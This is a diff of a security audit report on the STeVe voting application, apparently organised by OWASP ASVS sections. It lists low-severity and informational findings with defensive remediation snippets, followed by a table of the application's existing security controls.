+From the pyproject.toml alone, there is no evidence of containerization configuration (no Dockerfile reference, no container dependencies), sandboxing libraries (no seccomp, apparmor, or namespace isolation tools), network isolation configuration, or process isolation for cryptographic operations. The application uses cryptography (Fernet encryption) and argon2-cffi (hashing) which are critical security components. Per ASVS 15.2.5, these should be isolated to limit blast radius if compromised. This is a LOW finding because: 1. The pyproject.toml may not be the appropriate place for this configuration (Docker/K8s configs not in scope), 2. The domain context notes that the application does not use dangerous functionality like eval() or deserialization of untrusted data, 3. The cryptographic libraries themselves are well-maintained and considered safe. If a vulnerability is discovered in a dependency, there are no visible architectural barriers preventing lateral movement within the application.
+
+**Remediation:**
+
+Document the security architecture decisions regarding component isolation. Consider: 1. Running cryptographic operations in a separate process/service, 2. Adding a Dockerfile with minimal base image and non-root user, 3. Documenting network isolation in deployment configuration
+
+#### FINDING-276: Potential use of requests library without explicit redirect prevention configuration
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Section(s)** | 15.3.2 |
+| **Files** | v3/pyproject.toml |
+| **Source Reports** | 15.3.2.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The presence of `types-requests>=2.32.4,<3` in the lint dependency group strongly suggests that the `requests` library is used in the codebase (type stubs are only useful if the library is imported). The `requests` library follows redirects by default (`allow_redirects=True` for GET/OPTIONS, `True` for POST/PUT/PATCH/DELETE since 2.x). Additionally, `asfpy` (a transitive dependency) may make HTTP calls internally. Without source code review, it cannot be confirmed whether: 1. The application makes backend calls to external URLs 2. Whether `allow_redirects=False` is set on such calls 3. Whether the `asfpy`/`asfquart` libraries handle OAuth callbacks with redirect following. Data Flow: Application backend → `requests.get(url)` → follows redirect → SSRF to internal resource. Impact: Cannot be confirmed from dependency manifest alone. If backend HTTP calls exist without `allow_redirects=False`, an attacker could exploit open redirects to reach internal services.
+
+**Remediation:**
+
+If the application makes backend HTTP calls, ensure redirects are disabled: import requests; response = requests.get(url, allow_redirects=False, timeout=10); Or use a session with redirect disabled: session = requests.Session(); session.max_redirects = 0
+
+---
+
+#### FINDING-277: EasyDict May Suppress Type Errors Through Permissive Attribute Access
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Section(s)** | 15.3.5 |
+| **Files** | v3/pyproject.toml:14 |
+| **Source Reports** | 15.3.5.md |
+| **Related Findings** | - |
+
+**Description:**
+
+EasyDict converts dictionaries to objects with attribute access. This can mask type issues when user input (always strings from HTTP forms) is compared against expected types without explicit conversion/validation. In Python, while strict equality (==) is used by default (no === vs == distinction), type juggling risks exist when: String values from forms are compared to integers (e.g., "1" == 1 is False in Python, but int("1") == 1 is True — inconsistent handling); Boolean coercion is relied upon (e.g., empty string vs. None vs. False). Without seeing the actual application logic, this is a dependency-level risk indicator only.
+
+**Remediation:**
+
+Implement explicit type validation at input boundaries. Example: from typing import TypedDict; class VoteInput(TypedDict): election_id: str; candidate_id: str; def validate_vote_input(form_data: dict) -> VoteInput: if not isinstance(form_data.get("election_id"), str): raise ValueError("election_id must be a string"); if not isinstance(form_data.get("candidate_id"), str): raise ValueError("candidate_id must be a string"); return VoteInput(election_id=form_data["election_id"], candidate_id=form_data["candidate_id"])
+
+---
+
+#### FINDING-278: Quart/Werkzeug Multi-Value Parameter Handling Not Verifiably Constrained
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Section(s)** | 15.3.7 |
+| **Files** | v3/pyproject.toml:12 |
+| **Source Reports** | 15.3.7.md |
+| **Related Findings** | - |
+
+**Description:**
+
+Quart (built on Werkzeug) uses MultiDict for query parameters and form data, meaning duplicate parameter keys result in multi-valued entries. By default: request.args.get("key") returns the first value and request.args.getlist("key") returns all values. If the application code inconsistently uses .get() vs .getlist() or passes raw parameter dictionaries to downstream functions, HTTP Parameter Pollution could allow an attacker to inject unexpected values. Additionally, if request.values (which merges query string and form body) is used, parameters from different sources could conflict. Without the actual route handler code, the specific exposure cannot be confirmed. This is an architectural risk based on the framework choice.
+
+**Remediation:**
+
+Always use explicit parameter source. Use request.form or request.args specifically, never request.values. Reject duplicate parameters explicitly by checking if len(request.form.getlist("parameter_name")) > 1 and returning a 400 error. Example: from quart import request; @app.route("/vote", methods=["POST"]); async def submit_vote(): election_id = request.form.get("election_id", type=str); if len(request.form.getlist("election_id")) > 1: return "Duplicate parameter not allowed", 400
+
+---
+
+#### FINDING-279: No Thread Pool or Fair Scheduling Configuration Visible
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | - |
+| **ASVS Section(s)** | 15.4.4 |
+| **Files** | v3/pyproject.toml |
+| **Source Reports** | 15.4.4.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The project configuration does not reference any thread pool management, worker configuration, or fair scheduling mechanisms. The application relies on Quart's default async event loop (single-threaded by default) and SQLite's built-in locking (which uses a simple busy-wait/retry mechanism). Without explicit configuration of sqlite3 busy timeout, thread pool executor for blocking SQLite operations, or worker/request queue fairness policies, lower-priority or later-arriving requests could starve if SQLite's lock is held by a long-running operation (e.g., vote tallying with decryption). During election tallying (which involves decryption of all votes), write locks could block new vote submissions indefinitely if no busy timeout or fair scheduling is configured. This is a denial-of-service risk during critical voting periods.
+
+**Remediation:**
+
+Configure SQLite busy timeout to prevent indefinite waiting (e.g., conn.execute('PRAGMA busy_timeout = 5000')). Enable WAL mode for concurrent read access (conn.execute('PRAGMA journal_mode = WAL')). For longer operations like tallying, use a dedicated ThreadPoolExecutor with max_workers=2 to run CPU-intensive operations without blocking the event loop. Implement async wrapper: async def tally_votes(election_id): loop = asyncio.get_event_loop(); return await loop.run_in_executor(_executor, _sync_tally, election_id).
+
+---
+
+#### FINDING-280: Date/time operations use naive datetimes without timezone awareness
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.2.2 |
+| **Files** | v3/server/pages.py:86, v3/server/pages.py:571, v3/server/bin/tally.py:86 |
+| **Source Reports** | 16.2.2.md |
+| **Related Findings** | - |
+
+**Description:**
+
+All datetime operations use naive (timezone-unaware) datetime objects. While not directly a logging issue, this indicates that the application lacks UTC discipline, making it likely that log timestamps (when configured) would also use local time.
+
+**Remediation:**
+
+```python
+from datetime import datetime, timezone
+
+# Use UTC-aware datetimes
+datetime.now(timezone.utc)
+datetime.fromtimestamp(ts, tz=timezone.utc)
+```
+
+---
+
+#### FINDING-281: Tally script outputs decrypted vote results to stdout without log governance
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.2.3 |
+| **Files** | v3/server/bin/tally.py:129-135 |
+| **Source Reports** | 16.2.3.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The tally script outputs decrypted election results (including voter identities and vote tallies) directly to stdout. While this is the intended functionality of a CLI tool, it represents sensitive data being output to an undocumented channel. There is no logging of WHERE this output goes or who captures it. Without documentation of how tally outputs should be secured, results could be inadvertently captured in shell history, piped to insecure files, or logged by terminal multiplexers.
+
+**Remediation:**
+
+Add audit logging when results are output: _LOGGER.info(f'TALLY_OUTPUT election_id={election.eid} format={output_format} issues={len(results)} voters={len(all_voters)}'). Document in logging inventory that tally output is to stdout and must be handled per data classification policy.
+
+---
+
+#### FINDING-282: No request/correlation ID for tracing multi-step operations
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.2.4 |
+| **Files** | v3/server/pages.py:all endpoint handlers |
+| **Source Reports** | 16.2.4.md |
+| **Related Findings** | - |
+
+**Description:**
+
+When a user submits votes for multiple issues in a single request, each vote generates a separate log entry with no shared correlation ID. A log processor cannot determine that these entries belong to the same HTTP request without temporal proximity heuristics. This creates minor correlation difficulty for multi-issue vote submissions and could complicate forensic investigation of specific voting sessions.
+
+**Remediation:**
+
+Generate request-scoped correlation IDs using uuid. Example: request_id = str(uuid.uuid4())[:8]; for iid, votestring in votes.items(): _LOGGER.info(f'request_id={request_id} User[U:{result.uid}] voted on issue[I:{iid}] in election[E:{election.eid}]'). Better approach: Use Quart middleware to generate per-request IDs and use contextvars to propagate them.
+
+---
+
+#### FINDING-283: PersonDB Lookup Failure Handling
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.3.4 |
+| **Files** | v3/server/pages.py:303-313 |
+| **Source Reports** | 16.3.4.md |
+| **Related Findings** | - |
+
+**Description:**
+
+When a PersonNotFound exception occurs, the handler returns a 404 but doesn't log this unexpected condition. An authenticated user not found in PersonDB is an anomalous condition that could indicate a configuration issue or data integrity problem.
+
+**Remediation:**
+
+Add _LOGGER.warning() call when PersonNotFound exception occurs for authenticated users, including uid and context information
+
+---
+
+#### FINDING-284: No explicit HTTP method restrictions visible
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | - |
+| **ASVS Section(s)** | 4.1.4 |
+| **Files** | v3/server/api.py:1-21 |
+| **Source Reports** | 4.1.4.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The file defines no routes and contains no method restriction configuration. While the `asfquart` framework likely provides method-specific routing (e.g., `@app.route('/path', methods=['GET', 'POST'])`), there is no visible global rejection of unexpected methods (e.g., TRACE, TRACK, DELETE on endpoints that shouldn't support them) nor a catch-all handler to return 405 for undefined methods. If the framework's default behavior allows arbitrary HTTP methods on endpoints (e.g., TRACE for XST attacks, or unexpected method handling), unused methods may be accessible.
+
+**Remediation:**
+
+Add global method restriction or verify Quart/asfquart defaults reject unsupported methods with 405. Example implementation: Add a `@APP.before_request` handler that checks if `request.method` is in an allowed set `{'GET', 'POST', 'OPTIONS', 'HEAD'}` and returns 405 otherwise. Classified as LOW because Quart (like Flask) typically returns 405 automatically for methods not registered on a route. This finding is primarily about confirming that behavior and ensuring TRACE/TRACK are blocked at the server level.
+
+---
+
+#### FINDING-285: No per-message digital signature mechanism observed for highly sensitive transactions
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | - |
+| **ASVS Section(s)** | 4.1.5 |
+| **Files** | v3/server/api.py:1-21 |
+| **Source Reports** | 4.1.5.md |
+| **Related Findings** | - |
+
+**Description:**
+
+For a voting application handling highly sensitive transactions (vote casting, election management), there is no visible implementation of per-message digital signatures (e.g., HTTP Message Signatures RFC 9421, JWS, or HMAC-based request signing) that would provide integrity assurance beyond transport-layer TLS. Without per-message signatures, if TLS is terminated at a proxy and internal traffic is unencrypted, or if there are intermediary systems, message integrity cannot be independently verified. For a voting system, this means vote submissions could theoretically be tampered with in transit between internal components.
+
+**Remediation:**
+
+For highly sensitive operations (vote submission, election state changes), implement request signing using HMAC or digital signatures. Example implementation: Add a before_request handler that verifies X-Signature header using HMAC with a signing key, comparing against the expected signature of the request body using constant-time comparison. Consider implementing HTTP Message Signatures RFC 9421, JWS, or HMAC-based request signing for vote submission and election state changes.
+
+### 3.5 Informational
+
+#### FINDING-286: Coverage Gap - LDAP Operations Not Available for Review
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | ⚪ Informational |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 1.2.6 |
+| **Files** | asf-load-ldap.py (N/A - file not provided), asfquart.auth (N/A - external module not provided), asfquart.session (N/A - external module not provided) |
+| **Source Reports** | 1.2.6.md |
+| **Related** | None |
+
+**Description:**
+
+The domain context explicitly identifies `asf-load-ldap.py` as containing LDAP operations, but this file is not included in the provided source code. Additionally, the authentication layer (`asfquart.auth`, `asfquart.session`) likely interfaces with ASF LDAP for user authentication, but the implementation details are not available for review. No LDAP operations were found in the provided code files (`queries.yaml`, `api.py`, `pages.py`, `election.py`). The application relies on `asfquart` for authentication which presumably handles LDAP interactions internally.
+
+**Remediation:**
+
+Request and review `asf-load-ldap.py` and the `asfquart.auth` module's LDAP query construction. Verify that LDAP filters use proper escaping (e.g., `ldap.filter.escape_filter_chars()`) for any user-derived values.
+
+---
 
 ---
 
@@ -6514,456 +6670,449 @@ The application serves static assets locally via `STATICDIR = THIS_DIR / 'static
 
 | Control | Evidence | Files | Domain |
 |---------|----------|-------|--------|
-| **Cryptographically secure salt generation** | `crypto.py:gen_salt()` uses `secrets.token_bytes()` (CSPRNG) | `v3/steve/crypto.py:37` | Vote Encryption and Storage |
-| **Centralized cryptographic operations** | All cryptographic operations are centralized in `v3/steve/crypto.py`, making manual discovery straightforward and audit feasible | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **Industry-validated cryptographic libraries** | Uses `cryptography` library for symmetric encryption, `argon2-cffi` for password hashing, `hashlib.blake2b` for general hashing, `secrets` module for random generation | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **Fernet's encrypt-then-MAC design prevents Padding Oracle attacks** | Fernet verifies HMAC-SHA256 before attempting AES-CBC decryption, completely preventing Padding Oracle attacks | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **No insecure block modes (ECB) used** | Fernet uses AES-128-CBC with HMAC authentication, not ECB | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **Random IV generation per encrypt** | Fernet library guarantees a fresh 128-bit random IV for every encryption call, preventing nonce reuse | `cryptography.fernet.Fernet.encrypt()` | Vote Encryption and Storage |
-| **Well-designed multi-level key derivation chain** | `election_data → BLAKE2b → Argon2 → opened_key → (+ pid + iid + salt) → Argon2 → vote_token → HKDF → vote_key → Fernet(vote)` provides good key separation | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **Adequate key lengths for most operations** | HKDF derives 32-byte (256-bit) keys, Argon2 produces 32-byte outputs, BLAKE2b uses full 64-byte digest, salts are 16 bytes (128 bits) | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **Election data integrity via opened_key mechanism** | The `opened_key` mechanism (Argon2 hash of all election data) detects any unauthorized modification of the election structure | `v3/steve/election.py:is_tampered()` | Vote Encryption and Storage |
-| **Pinned crypto library versions** | `pyproject.toml` pins crypto library versions with upper bounds: `cryptography>=46.0.5,<47`, `argon2-cffi>=25.1.0,<26` | `pyproject.toml` | Vote Encryption and Storage |
-| **No disallowed hash functions (MD5, SHA-1 absent)** | MD5 and SHA-1 are completely absent from the codebase | — | Vote Encryption and Storage |
-| **SHA-256 in HKDF for key derivation** | The key derivation function uses NIST-approved SHA-256 | `v3/steve/crypto.py:62` | Vote Encryption and Storage |
-| **Argon2 memory-hard KDF usage** | The system uses a memory-hard KDF (Argon2) rather than PBKDF2 or bcrypt, which is current best practice | `v3/steve/crypto.py:85` | Vote Encryption and Storage |
-| **Adequate memory cost parameter (64 MB)** | `memory_cost=65536` provides meaningful GPU resistance | `v3/steve/crypto.py:91` | Vote Encryption and Storage |
-| **Benchmark utility for parameter tuning** | A utility exists (`benchmark_argon2()`) to help administrators tune parameters for their hardware | `v3/steve/crypto.py:108` | Vote Encryption and Storage |
-| **BLAKE2b for election data integrity (512-bit output)** | `crypto.py:gen_opened_key()` uses BLAKE2b with full 512-bit output exceeding 256-bit minimum for collision resistance | `v3/steve/crypto.py:45` | Vote Encryption and Storage |
-| **HMAC-SHA256 in Fernet for authenticated encryption** | Fernet provides both confidentiality (AES-128-CBC) and integrity (HMAC-SHA256) | — | Vote Encryption and Storage |
-| **Anti-tamper mechanism using `is_tampered()`** | `election.py` recomputes the `opened_key` from current election data and compares against stored value, providing 256-bit collision-resistant integrity verification | `v3/steve/election.py` | Vote Encryption and Storage |
-| **Salt generation uses proper CSPRNG with 128 bits of entropy** | `gen_salt()` correctly uses `secrets.token_bytes(16)` | `v3/steve/crypto.py:36` | Vote Encryption and Storage |
-| **Cryptographic shuffle implementation using CSPRNG** | `shuffle()` function implements Fisher-Yates using `secrets.randbelow()` for cryptographically secure randomization of vote order during tally | `v3/steve/crypto.py:93` | Vote Encryption and Storage |
-| **Python secrets module with OS-level CSPRNG** | All cryptographic random generation uses the `secrets` module, backed by `os.urandom()`. On modern Linux, uses kernel's CSPRNG (ChaCha20-based getrandom) which is non-blocking and designed to work securely under heavy demand | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **No blocking entropy sources** | The code does not use `/dev/random` or any blocking entropy sources that could be depleted under load | — | Vote Encryption and Storage |
-| **HKDF with appropriate parameters** | The `_b64_vote_key()` function uses HKDF-SHA256 with a proper salt and context info (`b'xchacha20_key'`), deriving a 32-byte key — approved per NIST SP 800-56C | `v3/steve/crypto.py:63` | Vote Encryption and Storage |
-| **Vote shuffling before return** | `crypto.shuffle(votes)` ensures that even if memory is inspected, the order of decrypted votes does not correlate to database insertion order (voter identity) | `v3/steve/election.py:tally_issue()` | Vote Encryption and Storage |
-| **Vote tokens are derived, not stored in plaintext** | Vote tokens are recomputed on each access rather than stored as plaintext lookup keys with PID associations | `v3/steve/election.py:tally_issue()` | Vote Encryption and Storage |
-| **Immediate vote encryption upon submission** | Votes encrypted immediately upon submission | `v3/steve/election.py:231` | Vote Encryption and Storage |
-| **Data minimization in queries - SALT and OPENED_KEY excluded** | SALT and OPENED_KEY excluded from public queries | `queries.yaml:q_open_to_me` | Vote Encryption and Storage |
-| **Explicit exclusion of secrets in public APIs** | Both `get_metadata()` and `get_issue()` deliberately exclude cryptographic material from returned data with comments documenting the intention | `v3/steve/election.py:get_metadata()`, `v3/steve/election.py:get_issue()` | Vote Encryption and Storage |
-| **No hardcoded secrets in source code** | The `config.yaml.example` file contains no passwords, API keys, or secret material — only structural configuration | `v3/server/config.yaml.example` | Vote Encryption and Storage |
-| **Environment variable injection pattern** | The application uses asfpy for external secret injection in containerized deployments, separating config from deployment | — | Vote Encryption and Storage |
-| **State machine enforcement for election lifecycle** | Assert statements prevent unauthorized state transitions (e.g., cannot delete opened elections, cannot vote on closed elections) | `v3/steve/election.py` | Vote Encryption and Storage |
-| **Per-issue voter authorization** | The `mayvote` table constrains which persons can vote on which issues, preventing unauthorized vote submission | `v3/schema.sql` | Vote Encryption and Storage |
-| **Centralized cryptographic module** | All cryptographic operations are consolidated in `crypto.py`, creating a clear architectural boundary that could be replaced with a vault/HSM integration point | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **No key material in logs** | The code uses `_LOGGER` but never logs salt, key, or token values (commented-out print statements are present but disabled) | `v3/steve/crypto.py` | Vote Encryption and Storage |
-| **Deferred key generation** | Cryptographic material only generated when election opens | `v3/steve/election.py:open()` | Vote Encryption and Storage |
-| **Immutability after closure** | `prevent_open_close_update` trigger and state assertions provide foundation for retention policies | `v3/schema.sql` | Vote Encryption and Storage |
-| **Parameterized queries in queries.yaml** | All 30+ queries use `?` placeholders | `v3/queries.yaml` | Database Security and Integrity |
-| **asfpy.db wrapper `.perform()` method** | All database interactions route through parameterized interface | `v3/steve/election.py` | Database Security and Integrity |
-| **Schema constraints (CHECK, GLOB)** | Type enforcement at database level | `v3/schema.sql` | Database Security and Integrity |
-| **Centralized Query Definition** | All SQL is defined in `queries.yaml` with `?` placeholders, separated from application logic | `v3/queries.yaml` | Database Security and Integrity |
-| **No Dynamic SQL Construction** | No string concatenation, f-strings, or format strings are used to build SQL | `v3/steve/election.py` | Database Security and Integrity |
-| **Implicit Separation of Internal vs External Data Access** | `_all_metadata()` marked INTERNAL ONLY vs. `get_metadata()` which strips sensitive fields | `v3/steve/election.py` | Database Security and Integrity |
-| **Query-Level Awareness of Sensitive Data** | `q_open_to_me` query explicitly comments 'SALT and OPENED_KEY are never returned for security' | `v3/queries.yaml` | Database Security and Integrity |
-| **Cryptographic Field Documentation** | Schema.md documents which fields use cryptographic operations and their byte sizes | `v3/docs/schema.md` | Database Security and Integrity |
-| **Logging Hygiene** | Logging only includes operation types and non-sensitive identifiers (EID, IID). No sensitive data (votes, salts, keys, PII) in log statements | `v3/steve/election.py` | Database Security and Integrity |
-| **Vote Privacy Architecture** | Separation of voter identity from vote content through vote_token derivation using Argon2 with per-voter salts, combined with encrypted vote storage and shuffling during tallying | `v3/steve/election.py` | Database Security and Integrity |
-| **Vote encryption using Fernet** | Applied in `add_vote()` via `crypto.create_vote()` | `v3/steve/election.py` | Database Security and Integrity |
-| **Tamper detection mechanism (opened_key)** | `is_tampered()` method exists (though not auto-called) | `v3/steve/election.py` | Database Security and Integrity |
-| **Salt generation using secrets module** | Applied in `add_salts()` via `crypto.gen_salt()` | `v3/steve/election.py` | Database Security and Integrity |
-| **Sensitive field filtering** | `get_metadata()` uses explicit allowlist, constructing new edict with only permitted fields | `v3/steve/election.py` | Database Security and Integrity |
-| **Transaction isolation** | Applied in multi-step operations | `v3/steve/election.py` | Database Security and Integrity |
-| **Vote shuffling before tally** | `crypto.shuffle(votes)` prevents database insertion order from leaking through tally results | `v3/steve/election.py` | Database Security and Integrity |
-| **No external API calls** | `v3/steve/election.py` (entire module) - no outbound HTTP requests | `v3/steve/election.py` | Database Security and Integrity |
-| **No tracking/analytics integration** | All provided files - no third-party SDK imports | — | Database Security and Integrity |
-| **Connection Cleanup** | The `delete()` and `_disappeared()` methods explicitly close database connections, preventing stale data in connection pools | `v3/steve/election.py` | Database Security and Integrity |
-| **Structured data model avoids file upload metadata leakage** | The application's data model uses structured fields (TEXT for titles/descriptions, BLOB for cryptographic data) rather than accepting arbitrary file uploads, which inherently avoids metadata leakage concerns in this layer | — | Database Security and Integrity |
-| **Server-side token exchange pattern** | `OAUTH_URL_CALLBACK` configuration shows authorization code is exchanged server-side, keeping tokens out of the browser | `v3/server/main.py:40-43` | ASF OAuth/LDAP Authentication |
-| **Session-based authentication architecture** | Application uses server-side sessions (`asfquart.session.read()`) rather than passing tokens to the client, eliminating traditional resource server attack surface | `v3/server/pages.py:82-88` | ASF OAuth/LDAP Authentication |
-| **Server-rendered templates with minimal data exposure** | EZT templates are server-rendered, and `basic_info()` function only passes display data (uid, name, email) to templates - never tokens | `v3/server/pages.py` | ASF OAuth/LDAP Authentication |
-| **Single authorization server hardcoded** | The application hardcodes a single authorization server (oauth.apache.org), eliminating the attack surface for OAuth mix-up attacks entirely | `v3/server/main.py:40-42` | ASF OAuth/LDAP Authentication |
-| **Role-based access control using `@asfquart.auth.require` decorator** | Applied consistently to all management endpoints to verify committer role from OAuth session, with elevated `R.pmc_member` role for election creation | `v3/server/pages.py:multiple endpoints` | ASF OAuth/LDAP Authentication |
-| **Voter eligibility verification** | `vote_on_page` handler correctly checks mayvote entries before allowing users to see voting options | `v3/server/pages.py:261-266` | ASF OAuth/LDAP Authentication |
-| **Authorization-aware domain model** | Election data model includes `owner_pid` and `authz` fields indicating correct authorization architecture design (though not yet enforced) | `v3/server/pages.py:domain model` | ASF OAuth/LDAP Authentication |
-| **Authorization code grant flow usage** | The application exclusively uses the authorization code flow (code parameter in callback URL), which is the recommended OAuth grant type. No evidence of implicit flow or password grant usage. | `v3/server/main.py:39-42` | ASF OAuth/LDAP Authentication |
-| **HTTPS for all OAuth endpoints** | All OAuth communication uses HTTPS protocol, protecting against passive network eavesdropping | `v3/server/main.py:39-42` | ASF OAuth/LDAP Authentication |
-| **State parameter for CSRF protection** | The OAuth URL template explicitly includes `state=%s`, showing the framework architecture was designed with CSRF protection in mind | `v3/server/main.py:40` | ASF OAuth/LDAP Authentication |
-| **Hardcoded OAuth URLs to prevent manipulation** | OAuth URLs are statically defined rather than dynamically discovered or user-configurable at runtime | `v3/server/main.py:39-42` | ASF OAuth/LDAP Authentication |
-| **No local refresh token storage visible** | The application does not appear to store or directly manage refresh tokens, reducing the attack surface for replay attacks at the application layer | — | ASF OAuth/LDAP Authentication |
-| **No dynamic client registration surface** | The application does not expose any dynamic client registration endpoints, eliminating this attack vector entirely | — | ASF OAuth/LDAP Authentication |
-| **Static client configuration** | OAuth configuration is hardcoded/configured statically with predefined OAuth endpoints, reducing the risk of malicious client registration | `main.py` | ASF OAuth/LDAP Authentication |
-| **Delegation to identity provider for token lifecycle** | Token lifecycle management is delegated to ASF's OAuth infrastructure (oauth.apache.org), which is appropriate for a relying party application | — | ASF OAuth/LDAP Authentication |
-| **Server-side sessions with server-side state** | Session invalidation can be performed server-side without needing client cooperation using asfquart.session | — | ASF OAuth/LDAP Authentication |
-| **State parameter included in OAuth authorization request for CSRF protection** | The state parameter is present in the authorization request URL template | `v3/server/main.py:39` | ASF OAuth/LDAP Authentication |
-| **Session-based identity storage rather than passing tokens to browser** | Application uses server-side sessions to store OAuth-derived identity, limiting some token replay vectors by not exposing tokens to client-side scripts | `v3/server/pages.py:82-91` | ASF OAuth/LDAP Authentication |
-| **Stable user identifier (uid field)** | The 'uid' field is used consistently as the sole user identifier across all endpoints | `pages.py:84` | ASF OAuth/LDAP Authentication |
-| **LDAP synchronization for authoritative identity** | LDAP synchronization script uses the LDAP 'uid' attribute which is stable and authoritative | `asf-load-ldap.py:53` | ASF OAuth/LDAP Authentication |
-| **Hardcoded OAuth URLs eliminate metadata spoofing** | By directly configuring `OAUTH_URL_INIT` and `OAUTH_URL_CALLBACK` to specific ASF endpoints, the application cannot be redirected to a malicious authorization server through metadata manipulation | `main.py:39-42` | ASF OAuth/LDAP Authentication |
-| **No back-channel logout attack surface** | Back-channel logout is not implemented, eliminating forced-logout denial of service and cross-JWT confusion in logout flow | — | ASF OAuth/LDAP Authentication |
-| **OAuth client configuration uses authorization code flow** | Application correctly uses code flow when acting as OAuth client | `main.py:39-42` | ASF OAuth/LDAP Authentication |
-| **LDAP-sourced user population** | Users come exclusively from organizational LDAP | `asf-load-ldap.py:main()` | ASF OAuth/LDAP Authentication |
-| **OAuth-based authentication with no local password database** | No local password database or default credentials | `main.py:create_app()` | ASF OAuth/LDAP Authentication |
-| **Single OAuth authentication pathway** | All user authentication flows through ASF OAuth with no alternate login mechanisms, API keys, or backdoor authentication paths | `main.py:create_app()` | ASF OAuth/LDAP Authentication |
-| **Consistent decorator pattern for authentication** | The `@asfquart.auth.require` decorator is consistently applied to all protected endpoints, establishing a clear authentication boundary | `v3/server/pages.py` | ASF OAuth/LDAP Authentication |
-| **OAuth-only authentication with no email-based authentication** | Authentication is performed exclusively via ASF OAuth tokens | `main.py:create_app()` | ASF OAuth/LDAP Authentication |
-| **Email used for display only** | `s['email']` read from session but not used for auth | `pages.py:basic_info()` | ASF OAuth/LDAP Authentication |
-| **OAuth delegation eliminates local login/register/forgot-password** | Authentication fully delegated to ASF OAuth — no local login/register/forgot-password | `main.py:40-43` | ASF OAuth/LDAP Authentication |
-| **Consistent error templates for elections** | The `load_election` decorator uses `T_BAD_EID` for both nonexistent elections and unauthorized access, preventing election enumeration | `pages.py:load_election` | ASF OAuth/LDAP Authentication |
-| **Single IdP configuration** | Only ASF OAuth is configured as the identity provider | `main.py:40-43` | ASF OAuth/LDAP Authentication |
-| **Server-side token exchange** | The `OAUTH_URL_CALLBACK` pattern indicates server-side code exchange, meaning tokens don't traverse the browser | `v3/server/main.py:40-43` | ASF OAuth/LDAP Authentication |
-| **HTTPS for IdP communication** | Both OAuth URLs use https://, preventing MITM attacks on the token exchange | `v3/server/main.py:40-43` | ASF OAuth/LDAP Authentication |
-| **OAuth 2.0 / OIDC used instead of SAML** | OAuth authorization and token endpoints configured | `main.py:40-43` | ASF OAuth/LDAP Authentication |
-| **Authentication requirements via decorators** | All endpoints have authentication requirements via `@asfquart.auth.require` decorators—no unauthenticated access to election operations | `v3/server/pages.py` | Election Authorization and Access Control |
-| **Voting eligibility validation on voting page** | `vote_on_page()` properly checks `q_find_issues` to verify the authenticated user has mayvote entries before showing the voting interface | `v3/server/pages.py:vote_on_page()` | Election Authorization and Access Control |
-| **Document access authorization check** | `serve_doc()` properly checks mayvote before serving election documents, ensuring only eligible voters can access materials | `v3/server/pages.py:serve_doc()` | Election Authorization and Access Control |
-| **Election state machine enforcement** | `is_editable()`, `is_open()`, `is_closed()` prevent out-of-order operations regardless of authorization gaps; state transitions enforced via assertions | `v3/steve/election.py` | Election Authorization and Access Control |
-| **Cryptographic field exclusion in `get_metadata()`** | `get_metadata()` explicitly constructs a safe subset of fields, excluding salt and opened_key with explicit comments ('# NEVER return salt/opened_key') | `v3/steve/election.py:163-177` | Election Authorization and Access Control |
-| **Issue salt filtering in `get_issue()`** | `get_issue()` returns only (title, description, type, kv), never the per-issue salt field | `v3/steve/election.py:179-187` | Election Authorization and Access Control |
-| **Vote anonymization design** | `vote_token` is a one-way hash that prevents reverse-engineering the voter's identity from the vote table | `v3/steve/election.py` | Election Authorization and Access Control |
-| **Implicit mayvote enforcement in add_vote** | `add_vote()` won't succeed without a corresponding mayvote entry (though mechanism is implicit rather than explicit) | `v3/steve/election.py:add_vote()` | Election Authorization and Access Control |
-| **Per-request vote state validation** | Every call to `add_vote()` validates `self.S_OPEN` via `_all_metadata(self.S_OPEN)`, ensuring closed elections immediately reject votes | `v3/steve/election.py:265` | Election Authorization and Access Control | ---
+| Cryptographically secure salt generation | Keys are generated using secrets.token_bytes() (CSPRNG) | v3/steve/crypto.py:gen_salt() | Vote Encryption & Cryptography |
+| Key derivation from election data | Well-designed multi-level key derivation chain: election_data → BLAKE2b → Argon2 → opened_key | v3/steve/crypto.py:gen_opened_key() | Vote Encryption & Cryptography |
+| Per-voter key derivation | Separate vote tokens derived per voter, limiting blast radius per key compromise | v3/steve/crypto.py:gen_vote_token() | Vote Encryption & Cryptography |
